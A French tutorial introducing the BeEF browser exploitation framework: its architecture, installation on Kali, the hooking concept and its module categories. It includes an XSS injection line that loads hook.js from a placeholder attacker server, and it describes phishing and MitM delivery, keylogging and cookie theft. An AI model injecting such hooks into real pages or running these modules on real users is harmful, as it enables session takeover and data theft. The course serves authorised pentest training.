# 🪝 Cours : BeEF (Browser Exploitation Framework)

> ⚠️ **Avertissement**
>
> Les exemples de scan, de reconnaissance et de connexion à des services doivent être exécutés uniquement sur des systèmes que vous possédez ou pour lesquels vous avez une autorisation explicite.
> Pour les démonstrations de cybersécurité, privilégiez un environnement de laboratoire isolé.

---

## 📖 Introduction à BeEF

**BeEF** (*Browser Exploitation Framework*) est une plateforme de test d'intrusion spécialisée dans l'analyse des faiblesses **côté client (navigateur web)**.

Contrairement aux frameworks d'exploitation traditionnels (comme Metasploit) qui ciblent souvent les services réseau ou le système d'exploitation, BeEF se concentre sur :
- Le navigateur web comme vecteur d'attaque principal.
- Le contrôle et la commande de sessions web compromises.
- L'exploitation de vulnérabilités (notamment **XSS - Cross-Site Scripting**) et d'attaques d'ingénierie sociale.

---

## Pourquoi utiliser BeEF ?

* **Évaluation de l'impact réel des failles XSS :** Démontrer qu'une injection XSS ne se limite pas à afficher un simple pop-up , mais peut mener à la compromission totale du contexte de navigation.
* **Bibliothèque de modules riche :** Permet la reconnaissance réseau interne, le vol de données, l'ingénierie sociale ciblée et le maintien de la persistance.
* **Interopérabilité :** S'intègre naturellement avec d'autres outils de pentest majeurs tels que **Metasploit Framework** et **Burp Suite**.

---

## Architecture globale

Le fonctionnement de BeEF repose sur une architecture client-serveur modulaire :

```text
+-------------------+                    +----------------------+
|  Pentester / GUI  |                    | Navigateur de Cible  |
|  (Interface Web)  |                    | (Session "Hookée")   |
+---------+---------+                    +----------+-----------+
          |                                         |
          | HTTP (Port 3000)                        | HTTP
          v                                         v
+---------------------------------------------------------------+
|                      Serveur BeEF (Ruby)                      |
|                  Fichier servi : hook.js                      |
+---------------------------------------------------------------+
```

1. **Serveur BeEF :** Application écrite en Ruby qui orchestre les attaques, gère la base de données des sessions et fournit l'interface d'administration.
2. **Script de Hook (`hook.js`) :** Code JavaScript injecté dans le navigateur cible.
3. **Client "Hooké" :** Le navigateur de la victime exécutant le script, qui maintient une connexion continue avec le serveur via polling HTTP ou WebSockets.
4. **Interface / API :** Tableau de bord permettant à l'auditeur d'exécuter des commandes et d'analyser les résultats.

---

## Installation & Démarrage (Kali Linux)

### Prérequis et installation

Sur Kali Linux, BeEF est disponible dans les dépôts officiels :

```bash
# Mise à jour des paquets
sudo apt update

# Installation de BeEF
sudo apt install beef-xss -y
```

### Configuration du mot de passe

> ⚠️ **Important :** Par défaut, le mot de passe initial `beef` doit être changé lors du premier démarrage via l'invite interactive.

### Démarrage du service

```bash
# Lancement de BeEF
sudo beef-xss-start
```

### Accès à l'interface d'administration

Une fois le serveur démarré, ouvrez votre navigateur et accédez à l'URL suivante :

* **URL du panneau :** `http://127.0.0.1:3000/ui/panel`
* **Identifiants par défaut :** Définis lors de l'initialisation (utilisateur : `beef`).

---

## Le principe de "Hooking"

Le "hooking" consiste à forcer un navigateur cible à charger le script JavaScript de contrôle de BeEF.

### Vecteurs de chargement :
1. **Vulnérabilité  :**
   ```html
   <script src="http://<IP_DU_SERVEUR_BEEF>:3000/hook.js"></script>
   ```
2. **Ingénierie sociale (Phishing) :** Inciter la victime à visiter une page malveillante ou un clone hébergeant le script.
3. **Attaque de type Man-in-the-Middle (MitM) :** Injection du tag `<script>` au vol dans du trafic HTTP non chiffré.

Dès que le navigateur charge la page, il commence à émettre des signaux (*heartbeats*) vers le serveur BeEF et apparaît instantanément dans la colonne des **Online Browsers** de l'interface d'administration.

---

## Catégories de Modules d'Exploitation

BeEF classe ses modules avec des indicateurs visuels de compatibilité (vert = invisible/fonctionnel, orange = visible pour l'utilisateur, rouge = incompatible).

| Catégorie | Description | Exemples d'actions |
| :--- | :--- | :--- |
| **Reconnaissance** | Identification de la cible | Détection du système d'exploitation, plugins installés, empreinte du navigateur, historique de navigation. |
| **Réseau** | Cartographie interne | Scan de ports TCP/UDP du réseau local (LAN) depuis le navigateur de la victime (*Pivoting*). |
| **Ingénierie Sociale** | Manipulation de l'utilisateur | Fausses alertes de mise à jour, fausses pages de connexion (Google, Microsoft, Facebook). |
| **Persistance** | Maintien de l'accès | Création de pop-unders transparents, événements d'annulation de fermeture d'onglet, exploitation d'extensions. |
| **Exfiltration** | Vol d'informations | Enregistrement des frappes au clavier (*Keylogger*), vol de cookies, capture des champs de formulaires (POST). |

---
